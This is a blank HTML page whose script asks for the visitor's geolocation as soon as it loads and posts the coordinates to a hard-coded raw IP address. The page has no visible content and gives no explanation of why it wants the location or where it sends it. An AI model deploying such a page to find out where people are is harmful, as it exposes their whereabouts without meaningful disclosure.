<!DOCTYPE html>
<html>
<body>
<script>
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(sendToServer, showError);
  } else {
    alert("Geolocation is not supported by this browser.");
  }
}

function sendToServer(position) {
  const data = {
    latitude: position.coords.latitude,
    longitude: position.coords.longitude,
    accuracy: position.coords.accuracy
  };

  // 发送到后端API，而非直接连接数据库
  fetch('https://152.136.105.29:82/save-location', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
}

function showError(error) {
  alert(`Error: ${error.message}`);
}

// 页面加载后请求权限
window.onload = getLocation;
</script>
</body>
</html>
